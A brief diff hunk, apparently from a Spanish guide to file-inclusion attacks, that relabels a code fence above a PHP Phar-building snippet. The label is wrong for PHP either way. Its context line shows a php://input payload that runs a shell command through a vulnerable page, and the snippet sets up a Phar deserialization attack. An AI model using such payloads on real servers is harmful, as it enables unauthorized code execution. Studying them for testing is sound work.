@@ -1846,7 +1846,7 @@ $~ echo "<? system('id'); ?>" | POST http://example.com/index.php?page=php://inp
 
 Crea un archivo **phar** con un objeto serializado en sus metadatos:
 
-```python
+```bash
 // create new Phar
 $phar = new Phar('test.phar');
 $phar->startBuffering();
